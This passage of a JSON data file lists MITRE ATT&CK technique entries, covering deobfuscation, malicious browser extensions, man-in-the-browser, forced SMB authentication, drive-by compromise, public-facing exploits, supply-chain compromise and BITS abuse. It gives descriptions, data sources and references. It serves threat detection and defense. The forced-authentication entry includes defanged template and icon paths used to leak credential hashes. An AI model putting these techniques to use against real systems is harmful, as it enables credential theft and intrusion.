    "id": "attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c",
    "platform": "windows|linux|macos",
    "tid": "T1140",
    "technique": "Deobfuscate/Decode Files or Information",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use <a href=\"https://attack.mitre.org/techniques/T1027\">Obfuscated Files or Information</a> to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.<!-- raw HTML omitted --><!-- raw HTML omitted -->One such example is use of <a href=\"https://attack.mitre.org/software/S0160\">certutil</a> to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <!-- raw HTML omitted -->copy /b<!-- raw HTML omitted --> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016)<!-- raw HTML omitted --><!-- raw HTML omitted -->Sometimes a user’s action may be required to open it for deobfuscation or decryption as part of <a href=\"https://attack.mitre.org/techniques/T1204\">User Execution</a>. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)</p>\n",
    "technique_references": [
      {
        "source_name": "Malwarebytes Targeted Attack against Saudi Arabia",
        "url": "https://blog.malwarebytes.com/cybercrime/social-engineering-cybercrime/2017/03/new-targeted-attack-saudi-arabia-government/",
        "description": "Malwarebytes Labs. (2017, March 27). New targeted attack against Saudi Arabia Government. Retrieved July 3, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Carbon Black Obfuscation Sept 2016",
        "url": "https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/",
        "description": "Tedesco, B. (2016, September 23). Security Alert Summary. Retrieved February 12, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Volexity PowerDuke November 2016",
        "url": "https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/",
        "description": "Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--389735f1-f21c-4208-b8f0-f8031e7169b8",
    "platform": "linux|macos|windows",
    "tid": "T1176",
    "technique": "Browser Extensions",
    "tactic": "persistence",
    "datasources": "browser-extensions|file-monitoring|process-monitoring|process-use-of-network|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse Internet browser extensions to establish persistence access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser’s app store and generally have access and permissions to everything that the browser can access. (Citation: Wikipedia Browser Extension) (Citation: Chrome Extensions Definition)<!-- raw HTML omitted --><!-- raw HTML omitted -->Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners. (Citation: Malicious Chrome Extension Numbers) Once the extension is installed, it can browse to websites in the background, (Citation: Chrome Extension Crypto Miner) (Citation: ICEBRG Chrome Extensions) steal all information that a user enters into a browser (including credentials) (Citation: Banker Google Chrome Extension Steals Creds) (Citation: Catch All Chrome Extension) and be used as an installer for a RAT for persistence.<!-- raw HTML omitted --><!-- raw HTML omitted -->There have also been instances of botnets using a persistent backdoor through malicious Chrome extensions. (Citation: Stantinko Botnet) There have also been similar examples of extensions being used for command &amp; control  (Citation: Chrome Extension C2 Malware).</p>\n",
    "technique_references": [
      {
        "source_name": "Wikipedia Browser Extension",
        "url": "https://en.wikipedia.org/wiki/Browser_extension",
        "description": "Wikipedia. (2017, October 8). Browser Extension. Retrieved January 11, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Chrome Extensions Definition",
        "url": "https://developer.chrome.com/extensions",
        "description": "Chrome. (n.d.). What are Extensions?. Retrieved November 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Malicious Chrome Extension Numbers",
        "url": "https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/43824.pdf",
        "description": "Jagpal, N., et al. (2015, August). Trends and Lessons from Three Years Fighting Malicious Extensions. Retrieved November 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Chrome Extension Crypto Miner",
        "url": "https://www.ghacks.net/2017/09/19/first-chrome-extension-with-javascript-crypto-miner-detected/",
        "description": "Brinkmann, M. (2017, September 19). First Chrome extension with JavaScript Crypto Miner detected. Retrieved November 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "ICEBRG Chrome Extensions",
        "url": "https://www.icebrg.io/blog/malicious-chrome-extensions-enable-criminals-to-impact-over-half-a-million-users-and-global-businesses",
        "description": "De Tore, M., Warner, J. (2018, January 15). MALICIOUS CHROME EXTENSIONS ENABLE CRIMINALS TO IMPACT OVER HALF A MILLION USERS AND GLOBAL BUSINESSES. Retrieved January 17, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Banker Google Chrome Extension Steals Creds",
        "url": "https://isc.sans.edu/forums/diary/BankerGoogleChromeExtensiontargetingBrazil/22722/",
        "description": "Marinho, R. (n.d.). (Banker(GoogleChromeExtension)).targeting. Retrieved November 18, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Catch All Chrome Extension",
        "url": "https://isc.sans.edu/forums/diary/CatchAll+Google+Chrome+Malicious+Extension+Steals+All+Posted+Data/22976/https:/threatpost.com/malicious-chrome-extension-steals-data-posted-to-any-website/128680/)",
        "description": "Marinho, R. (n.d.). \"Catch-All\" Google Chrome Malicious Extension Steals All Posted Data. Retrieved November 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Stantinko Botnet",
        "url": "https://www.welivesecurity.com/2017/07/20/stantinko-massive-adware-campaign-operating-covertly-since-2012/",
        "description": "Vachon, F., Faou, M. (2017, July 20). Stantinko: A massive adware campaign operating covertly since 2012. Retrieved November 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Chrome Extension C2 Malware",
        "url": "https://kjaer.io/extension-malware/",
        "description": "Kjaer, M. (2016, July 18). Malware in the browser: how you might get hacked by a Chrome extension. Retrieved November 22, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--544b0346-29ad-41e1-a808-501bb4193f47",
    "platform": "windows",
    "tid": "T1185",
    "technique": "Man in the Browser",
    "tactic": "collection",
    "datasources": "api-monitoring|authentication-logs|packet-capture|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries can take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify behavior, and intercept information as part of various man in the browser techniques. (Citation: Wikipedia Man in the Browser)<!-- raw HTML omitted --><!-- raw HTML omitted -->A specific example is when an adversary injects software into a browser that allows an them to inherit cookies, HTTP sessions, and SSL client certificates of a user and use the browser as a way to pivot into an authenticated intranet. (Citation: Cobalt Strike Browser Pivot) (Citation: ICEBRG Chrome Extensions)<!-- raw HTML omitted --><!-- raw HTML omitted -->Browser pivoting requires the SeDebugPrivilege and a high-integrity process to execute. Browser traffic is pivoted from the adversary’s browser through the user’s browser by setting up an HTTP proxy which will redirect any HTTP and HTTPS traffic. This does not alter the user’s traffic in any way. The proxy connection is severed as soon as the browser is closed. Whichever browser process the proxy is injected into, the adversary assumes the security context of that process. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could browse to any resource on an intranet that is accessible through the browser and which the browser has sufficient permissions, such as Sharepoint or webmail. Browser pivoting also eliminates the security provided by 2-factor authentication. (Citation: cobaltstrike manual)</p>\n",
    "technique_references": [
      {
        "source_name": "Wikipedia Man in the Browser",
        "url": "https://en.wikipedia.org/wiki/Man-in-the-browser",
        "description": "Wikipedia. (2017, October 28). Man-in-the-browser. Retrieved January 10, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Cobalt Strike Browser Pivot",
        "url": "https://www.cobaltstrike.com/help-browser-pivoting",
        "description": "Mudge, R. (n.d.). Browser Pivoting. Retrieved January 10, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "ICEBRG Chrome Extensions",
        "url": "https://www.icebrg.io/blog/malicious-chrome-extensions-enable-criminals-to-impact-over-half-a-million-users-and-global-businesses",
        "description": "De Tore, M., Warner, J. (2018, January 15). MALICIOUS CHROME EXTENSIONS ENABLE CRIMINALS TO IMPACT OVER HALF A MILLION USERS AND GLOBAL BUSINESSES. Retrieved January 17, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "cobaltstrike manual",
        "url": "https://cobaltstrike.com/downloads/csmanual38.pdf",
        "description": "Strategic Cyber LLC. (2017, March 14). Cobalt Strike Manual. Retrieved May 24, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b77cf5f3-6060-475d-bd60-40ccbf28fdc2",
    "platform": "windows",
    "tid": "T1187",
    "technique": "Forced Authentication",
    "tactic": "credential-access",
    "datasources": "file-monitoring|network-device-logs|network-protocol-analysis|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.<!-- raw HTML omitted --><!-- raw HTML omitted -->The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. (Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.<!-- raw HTML omitted --><!-- raw HTML omitted -->Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV Security)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. <a href=\"https://attack.mitre.org/techniques/T1221\">Template Injection</a>), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user’s system accesses the untrusted resource it will attempt authentication and send information, including the user’s hashed credentials, over SMB to the adversary controlled server. (Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform off-line <a href=\"https://attack.mitre.org/techniques/T1110\">Brute Force</a> cracking to gain access to plaintext credentials. (Citation: Cylance Redirect to SMB)<!-- raw HTML omitted --><!-- raw HTML omitted -->There are several different ways this can occur. (Citation: Osanda Stealing NetNTLM Hashes) Some specifics from in-the-wild use include:<!-- raw HTML omitted --><!-- raw HTML omitted -->* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. <a href=\"https://attack.mitre.org/techniques/T1221\">Template Injection</a>). The document can include, for example, a request similar to <!-- raw HTML omitted -->file[:]//[remote address]/Normal.dotm<!-- raw HTML omitted --> to trigger the SMB request. (Citation: US-CERT APT Energy Oct 2017)<!-- raw HTML omitted -->* A modified .LNK or .SCF file with the icon filename pointing to an external reference such as <!-- raw HTML omitted -->\\[remote address]\\pic.png<!-- raw HTML omitted --> that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. (Citation: US-CERT APT Energy Oct 2017)</p>\n",
    "technique_references": [
      {
        "source_name": "Wikipedia Server Message Block",
        "url": "https://en.wikipedia.org/wiki/Server_Message_Block",
        "description": "Wikipedia. (2017, December 16). Server Message Block. Retrieved December 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Didier Stevens WebDAV Traffic",
        "url": "https://blog.didierstevens.com/2017/11/13/webdav-traffic-to-malicious-sites/",
        "description": "Stevens, D. (2017, November 13). WebDAV Traffic To Malicious Sites. Retrieved December 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Managing WebDAV Security",
        "url": "https://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/4beddb35-0cba-424c-8b9b-a5832ad8e208.mspx",
        "description": "Microsoft. (n.d.). Managing WebDAV Security (IIS 6.0). Retrieved December 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Hashjacking",
        "url": "https://github.com/hob0/hashjacking",
        "description": "Dunning, J. (2016, August 1). Hashjacking. Retrieved December 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Cylance Redirect to SMB",
        "url": "https://www.cylance.com/content/dam/cylance/pdfs/white_papers/RedirectToSMB.pdf",
        "description": "Cylance. (2015, April 13). Redirect to SMB. Retrieved December 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Osanda Stealing NetNTLM Hashes",
        "url": "https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/",
        "description": "Osanda Malith Jayathissa. (2017, March 24). Places of Interest in Stealing NetNTLM Hashes. Retrieved January 26, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "US-CERT APT Energy Oct 2017",
        "url": "https://www.us-cert.gov/ncas/alerts/TA17-293A",
        "description": "US-CERT. (2017, October 20). Alert (TA17-293A): Advanced Persistent Threat Activity Targeting Energy and Other Critical Infrastructure Sectors. Retrieved November 2, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--d742a578-d70e-4d0e-96a6-02a9c30204e6",
    "platform": "windows|linux|macos|saas",
    "tid": "T1189",
    "technique": "Drive-by Compromise",
    "tactic": "initial-access",
    "datasources": "network-device-logs|network-intrusion-detection-system|packet-capture|process-use-of-network|ssl-tls-inspection|web-proxy",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user’s web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring <a href=\"https://attack.mitre.org/techniques/T1550/001\">Application Access Token</a>.<!-- raw HTML omitted --><!-- raw HTML omitted -->Multiple ways of delivering exploit code to a browser exist, including:<!-- raw HTML omitted --><!-- raw HTML omitted -->* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting.<!-- raw HTML omitted -->* Malicious ads are paid for and served through legitimate ad providers.<!-- raw HTML omitted -->* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).<!-- raw HTML omitted --><!-- raw HTML omitted -->Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.(Citation: Shadowserver Strategic Web Compromise)<!-- raw HTML omitted --><!-- raw HTML omitted -->Typical drive-by compromise process:<!-- raw HTML omitted --><!-- raw HTML omitted -->1. A user visits a website that is used to host the adversary controlled content.<!-- raw HTML omitted -->2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. <!-- raw HTML omitted -->    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.<!-- raw HTML omitted -->3. Upon finding a vulnerable version, exploit code is delivered to the browser.<!-- raw HTML omitted -->4. If exploitation is successful, then it will give the adversary code execution on the user’s system unless other protections are in place.<!-- raw HTML omitted -->    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.<!-- raw HTML omitted --><!-- raw HTML omitted -->Unlike <a href=\"https://attack.mitre.org/techniques/T1190\">Exploit Public-Facing Application</a>, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may also use compromised websites to deliver a user to a malicious application designed to <a href=\"https://attack.mitre.org/techniques/T1528\">Steal Application Access Token</a>s, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.(Citation: Volexity OceanLotus Nov 2017)</p>\n",
    "technique_references": [
      {
        "source_name": "Shadowserver Strategic Web Compromise",
        "url": "http://blog.shadowserver.org/2012/05/15/cyber-espionage-strategic-web-compromises-trusted-websites-serving-dangerous-results/",
        "description": "Adair, S., Moran, N. (2012, May 15). Cyber Espionage & Strategic Web Compromises – Trusted Websites Serving Dangerous Results. Retrieved March 13, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Volexity OceanLotus Nov 2017",
        "url": "https://www.volexity.com/blog/2017/11/06/oceanlotus-blossoms-mass-digital-surveillance-and-exploitation-of-asean-nations-the-media-human-rights-and-civil-society/",
        "description": "Lassalle, D., et al. (2017, November 6). OceanLotus Blossoms: Mass Digital Surveillance and Attacks Targeting ASEAN, Asian Nations, the Media, Human Rights Groups, and Civil Society. Retrieved November 6, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
    "platform": "linux|windows|macos|aws|gcp|azure|network",
    "tid": "T1190",
    "technique": "Exploit Public-Facing Application",
    "tactic": "initial-access",
    "datasources": "application-logs|aws-cloudtrail-logs|azure-activity-logs|packet-capture|stackdriver-logs|web-application-firewall-logs|web-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL)(Citation: NVD CVE-2016-6662), standard services (like SMB(Citation: CIS Multiple SMB Vulnerabilities) or SSH), network device administration and management protocols (like SNMP and Smart Install(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)), and any other applications with Internet accessible open sockets, such as web servers and related services.(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may include <a href=\"https://attack.mitre.org/techniques/T1211\">Exploitation for Defense Evasion</a>. <!-- raw HTML omitted --><!-- raw HTML omitted -->If an application is hosted on cloud-based infrastructure, then exploiting it may lead to compromise of the underlying instance. This can allow an adversary a path to access the cloud APIs or to take advantage of weak identity and access management policies.<!-- raw HTML omitted --><!-- raw HTML omitted -->For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)</p>\n",
    "technique_references": [
      {
        "source_name": "NVD CVE-2016-6662",
        "url": "https://nvd.nist.gov/vuln/detail/CVE-2016-6662",
        "description": "National Vulnerability Database. (2017, February 2). CVE-2016-6662 Detail. Retrieved April 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "CIS Multiple SMB Vulnerabilities",
        "url": "https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-microsoft-windows-smb-server-could-allow-for-remote-code-execution/",
        "description": "CIS. (2017, May 15). Multiple Vulnerabilities in Microsoft Windows SMB Server Could Allow for Remote Code Execution. Retrieved April 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "US-CERT TA18-106A Network Infrastructure Devices 2018",
        "url": "https://us-cert.cisa.gov/ncas/alerts/TA18-106A",
        "description": "US-CERT. (2018, April 20). Russian State-Sponsored Cyber Actors Targeting Network Infrastructure Devices. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Blog Legacy Device Attacks",
        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "NVD CVE-2014-7169",
        "url": "https://nvd.nist.gov/vuln/detail/CVE-2014-7169",
        "description": "National Vulnerability Database. (2017, September 24). CVE-2014-7169 Detail. Retrieved April 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "OWASP Top 10",
        "url": "https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project",
        "description": "OWASP. (2018, February 23). OWASP Top Ten Project. Retrieved April 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "CWE top 25",
        "url": "https://cwe.mitre.org/top25/index.html",
        "description": "Christey, S., Brown, M., Kirby, D., Martin, B., Paller, A.. (2011, September 13). 2011 CWE/SANS Top 25 Most Dangerous Software Errors. Retrieved April 10, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7",
    "platform": "linux|windows|macos",
    "tid": "T1195",
    "technique": "Supply Chain Compromise",
    "tactic": "initial-access",
    "datasources": "file-monitoring|web-proxy",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1195.001",
      "T1195.002",
      "T1195.003"
    ],
    "count_subtechniques": 3,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.<!-- raw HTML omitted --><!-- raw HTML omitted -->Supply chain compromise can take place at any stage of the supply chain including:<!-- raw HTML omitted --><!-- raw HTML omitted -->* Manipulation of development tools<!-- raw HTML omitted -->* Manipulation of a development environment<!-- raw HTML omitted -->* Manipulation of source code repositories (public or private)<!-- raw HTML omitted -->* Manipulation of source code in open-source dependencies<!-- raw HTML omitted -->* Manipulation of software update/distribution mechanisms<!-- raw HTML omitted -->* Compromised/infected system images (multiple cases of removable media infected at the factory) (Citation: IBM Storwize) (Citation: Schneider Electric USB Malware) <!-- raw HTML omitted -->* Replacement of legitimate software with modified versions<!-- raw HTML omitted -->* Sales of modified/counterfeit products to legitimate distributors<!-- raw HTML omitted -->* Shipment interdiction<!-- raw HTML omitted --><!-- raw HTML omitted -->While supply chain compromise can impact any component of hardware or software, attackers looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels. (Citation: Avast CCleaner3 2018) (Citation: Microsoft Dofoil 2018) (Citation: Command Five SK 2011) Targeting may be specific to a desired victim set (Citation: Symantec Elderwood Sept 2012) or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. (Citation: Avast CCleaner3 2018) (Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency. (Citation: Trendmicro NPM Compromise)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/437.html",
        "description": "none",
        "external_id": "CAPEC-437"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/438.html",
        "description": "none",
        "external_id": "CAPEC-438"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/439.html",
        "description": "none",
        "external_id": "CAPEC-439"
      },
      {
        "source_name": "IBM Storwize",
        "url": "https://www-01.ibm.com/support/docview.wss?uid=ssg1S1010146&myns=s028&mynp=OCSTHGUJ&mynp=OCSTLM5A&mynp=OCSTLM6B&mynp=OCHW206&mync=E&cm_sp=s028-_-OCSTHGUJ-OCSTLM5A-OCSTLM6B-OCHW206-_-E",
        "description": "IBM Support. (2017, April 26). Storwize USB Initialization Tool may contain malicious code. Retrieved May 28, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Schneider Electric USB Malware",
        "url": "https://www.se.com/ww/en/download/document/SESN-2018-236-01/",
        "description": "Schneider Electric. (2018, August 24). Security Notification – USB Removable Media Provided With Conext Combox and Conext Battery Monitor. Retrieved May 28, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Avast CCleaner3 2018",
        "url": "https://blog.avast.com/new-investigations-in-ccleaner-incident-point-to-a-possible-third-stage-that-had-keylogger-capacities",
        "description": "Avast Threat Intelligence Team. (2018, March 8). New investigations into the CCleaner incident point to a possible third stage that had keylogger capacities. Retrieved March 15, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Dofoil 2018",
        "url": "https://cloudblogs.microsoft.com/microsoftsecure/2018/03/07/behavior-monitoring-combined-with-machine-learning-spoils-a-massive-dofoil-coin-mining-campaign/",
        "description": "Windows Defender Research. (2018, March 7). Behavior monitoring combined with machine learning spoils a massive Dofoil coin mining campaign. Retrieved March 20, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Command Five SK 2011",
        "url": "https://www.commandfive.com/papers/C5_APT_SKHack.pdf",
        "description": "Command Five Pty Ltd. (2011, September). SK Hack by an Advanced Persistent Threat. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Symantec Elderwood Sept 2012",
        "url": "http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the-elderwood-project.pdf",
        "description": "O'Gorman, G., and McDonald, G.. (2012, September 6). The Elderwood Project. Retrieved February 15, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Trendmicro NPM Compromise",
        "url": "https://www.trendmicro.com/vinfo/dk/security/news/cybercrime-and-digital-threats/hacker-infects-node-js-package-to-steal-from-bitcoin-wallets",
        "description": "Trendmicro. (2018, November 29). Hacker Infects Node.js Package to Steal from Bitcoin Wallets. Retrieved April 10, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--c8e87b83-edbb-48d4-9295-4974897525b7",
    "platform": "windows",
    "tid": "T1197",
    "technique": "BITS Jobs",
    "tactic": "defense-evasion",
    "datasources": "packet-capture|process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through <a href=\"https://attack.mitre.org/techniques/T1559/001\">Component Object Model</a> (COM). (Citation: Microsoft COM) (Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.<!-- raw HTML omitted --><!-- raw HTML omitted -->The interface to create and manage BITS jobs is accessible through <a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a>  (Citation: Microsoft BITS) and the <a href=\"https://attack.mitre.org/software/S0190\">BITSAdmin</a> tool. (Citation: Microsoft BITSAdmin)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse BITS to download, execute, and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. (Citation: CTU BITS Malware June 2016) (Citation: Mondok Windows PiggyBack BITS May 2007) (Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots). (Citation: PaloAlto UBoatRAT Nov 2017) (Citation: CTU BITS Malware June 2016)<!-- raw HTML omitted --><!-- raw HTML omitted -->BITS upload functionalities can also be used to perform <a href=\"https://attack.mitre.org/techniques/T1048\">Exfiltration Over Alternative Protocol</a>. (Citation: CTU BITS Malware June 2016)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft COM",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx",
        "description": "Microsoft. (n.d.). Component Object Model (COM). Retrieved November 22, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft BITS",
        "url": "https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx",
        "description": "Microsoft. (n.d.). Background Intelligent Transfer Service. Retrieved January 12, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft BITSAdmin",
        "url": "https://msdn.microsoft.com/library/aa362813.aspx",
        "description": "Microsoft. (n.d.). BITSAdmin Tool. Retrieved January 12, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "CTU BITS Malware June 2016",
        "url": "https://www.secureworks.com/blog/malware-lingers-with-bits",
        "description": "Counter Threat Unit Research Team. (2016, June 6). Malware Lingers with BITS. Retrieved January 12, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Mondok Windows PiggyBack BITS May 2007",
        "url": "https://arstechnica.com/information-technology/2007/05/malware-piggybacks-on-windows-background-intelligent-transfer-service/",
        "description": "Mondok, M. (2007, May 11). Malware piggybacks on Windows’ Background Intelligent Transfer Service. Retrieved January 12, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Symantec BITS May 2007",
        "url": "https://www.symantec.com/connect/blogs/malware-update-windows-update",
